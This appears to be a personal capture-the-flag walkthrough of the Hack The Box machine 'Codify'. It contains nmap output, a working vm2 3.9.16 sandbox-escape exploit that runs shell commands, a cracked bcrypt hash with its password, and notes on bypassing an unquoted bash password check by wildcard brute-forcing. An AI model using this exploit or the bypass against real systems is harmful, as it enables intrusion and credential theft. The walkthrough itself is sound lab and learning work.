Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 20:42 EST
Nmap scan report for 10.129.156.254
Host is up (0.044s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

------------

└─$ nmap -p- 10.10.11.239               
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-16 21:45 EST
Nmap scan report for 10.10.11.239
Host is up (0.039s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp


10.10.11.239:80 > redirects to codify.htb
possible email: support@codify.htb

nodejs interpreter, limitations exist - http://codify.htb/limitations
This is the sandboxing tool used - https://github.com/patriksimek/vm2/releases/tag/3.9.16

https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244 sandbox escape for this vm2 version, just copy/paste this into the editor and you get code execution:
---------------------
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('ls');
}
`

console.log(vm.run(code));
-------------------------------

I doubt this is how you were supposed to do this, however I could not really get a rev shell to work, so I instead spun up a basic python http webserver so I could download the tickets.db file that I found while browsing using the above exploit.

this db file has a username and hash:
joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
which decrypts to spongebob1.


We get user.txt, and I am fairly confident I already know the privesc, likely has something to do with this file:

#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'


in this script, you need to add quotes after the == comparison, as they dont here, we can use a wildcare to bypass the check.  Knowing this, I created a script that used this trick + bruteforced all possibilites to generate the actual root pass


